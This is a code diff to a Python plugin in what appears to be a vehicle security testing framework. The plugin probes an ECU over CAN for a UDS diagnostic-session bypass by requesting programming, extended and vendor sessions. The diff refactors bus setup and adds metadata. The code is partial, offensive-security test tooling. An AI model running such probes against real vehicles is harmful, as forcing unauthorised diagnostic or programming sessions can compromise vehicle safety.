@@ -11,17 +11,27 @@ Usage: python3 26_UDS_DiagSession_Bypass.py PCAN_USBBUS1
 """
 import sys
 from iv_plugin_base import IVIVulnerabilityPlugin
+from can_bus_utils import format_can_settings, get_can_settings, open_can_bus
 class UDSDiagSessionPlugin(IVIVulnerabilityPlugin):
-    def check_prerequisites(self): return True
+    meta_poc_name = "UDS Diagnostic Session Bypass"
+    meta_cve_id = "N/A"
+    meta_severity = "High"
+    meta_protocol = "can"
+    meta_target_os = ["all"]
+    meta_required_params = ["can_interface"]
+    is_disruptive = False
+    meta_destructive_level = "Safe"
+
+    def check_prerequisites(self):
+        settings = get_can_settings(self.params)
+        self.logger.info(f"检查CAN接口: {format_can_settings(settings)}")
+        return True
     def exploit(self):
-        iface = self.params.get("can_interface", "PCAN_USBBUS1")
-        self.logger.info(f"UDS诊断会话测试 ({iface})...")
+        settings = get_can_settings(self.params)
+        self.logger.info(f"UDS诊断会话测试 ({format_can_settings(settings)})...")
         try:
             import can
-            if "PCAN" in iface:
-                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
-            else:
-                bus = can.interface.Bus(channel=iface, bustype="socketcan")
+            bus = open_can_bus(self.params)
             sessions = [(0x02, "Programming"), (0x03, "ExtendedDiag"), (0x60, "Vendor")]
             for sub, name in sessions:
                 msg = can.Message(arbitration_id=0x7E0,
@@ -53,5 +63,5 @@ if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python3 26_UDS_DiagSession_Bypass.py <can_interface>")
         sys.exit(1)
-    plugin = UDSDiagSessionPlugin({"target_ip": "N/A", "can_interface": iface})
+    plugin = UDSDiagSessionPlugin({"target_ip": "N/A", "can_interface": sys.argv[1]})
     plugin.run_verify()
